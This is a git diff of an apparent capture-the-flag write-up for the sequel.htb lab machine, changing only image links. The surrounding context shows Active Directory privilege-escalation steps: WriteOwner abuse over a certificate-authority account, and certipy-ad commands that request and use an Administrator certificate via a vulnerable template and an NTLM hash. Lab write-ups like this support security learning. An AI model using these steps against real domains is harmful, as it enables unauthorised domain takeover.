@@ -113,7 +113,7 @@ Launch the BloodHound GUI and upload the extracted data. From there, we'll exami
 
 It appears that `Ryan` has the **WriteOwner** permission on the Certificate Authority user account (**ca\_svc**). This allows `Ryan` to modify or take ownership of the **ca\_svc** account, which could potentially be exploited to escalate privileges.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Grant Ownership
 
@@ -155,7 +155,7 @@ sudo ntpdate sequel.htb
 
 ### Vulnerable Cert Template
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -179,7 +179,7 @@ Using the `ca_svc` account and NTLM hash, requested a certificate for the Admini
 certipy-ad req -dc-ip 10.10.11.51 -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 Successfully received the Administrator certificate saved as `administrator.pfx`.
 
@@ -191,7 +191,7 @@ Authenticated using the certificate:
 certipy-ad auth -pfx administrator.pfx
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Access Administrator Shell with Evil-WinRm
 
